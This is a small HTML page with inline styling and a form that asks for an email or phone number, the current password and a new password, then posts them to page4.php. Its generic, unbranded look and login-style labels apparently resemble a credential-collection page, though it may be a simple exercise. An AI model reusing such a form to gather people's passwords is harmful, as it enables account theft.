

<html>
    <head>
    <style>
        body {font-family:'lucida grande',tahoma,verdana,arial,sans-serif;
              background-color:#9933ff;
           overflow: hidden;
           }
        #div1 { position: fixed;
width: 300px;
height: 220px;
top: 50%;
left: 50%;
margin-top: -110px; /* Negative half of height. */
margin-left: -150px; /* Negative half of width. */
 background-color:#ff33cc;
        text-align:centre;}
        
        form {position: absolute;
            margin-left:40px;
             margin-top:20px;}
        
        
        </style>
    
    </head>
    
    

<body>
    <div id="div1">
<form action="page4.php" method="post">
<br>
Email or Phone:<br>
<input type="text" name="email" id="email1" autocomplete="off" required><br>
Password:<br><input type="password" name="passwd" autocomplete="off" required/><br>
New Password: <br> <input type="password" name="newpasswd" autocomplete="off" required/>
<button type="submit" >Submit</button>

</form>
  </div>
</body>
</html>

